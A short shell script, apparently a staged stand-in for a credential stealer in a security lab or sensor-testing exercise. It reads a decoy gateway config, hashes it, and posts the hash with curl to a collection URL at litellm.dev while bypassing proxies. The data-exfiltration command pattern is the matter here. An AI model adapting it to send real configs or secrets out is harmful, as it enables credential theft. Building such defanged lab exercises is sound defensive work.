#!/bin/sh
# Level 1, stage 1: harmless stand-in for the credential stealer. It reads the
# decoy gateway config and sends ONLY its sha256 to litellm.dev. Nothing guards
# this path: Level 1 has no sensor. The network is internal, so nothing leaves.
set -u
cfg=/gateway/config.yaml
[ -f "$cfg" ] || { echo "no decoy config" >&2; exit 3; }
hash=$(sha256sum "$cfg" | cut -d' ' -f1)
# --noproxy: there is no sensor in Level 1. The sink is plain TCP, so the TLS
# handshake fails after the connect. That is expected.
curl -s -m 10 --noproxy '*' -o /dev/null --data "sha256=$hash" https://litellm.dev/collect 2>/dev/null || true
echo "stolen sha256=$hash"
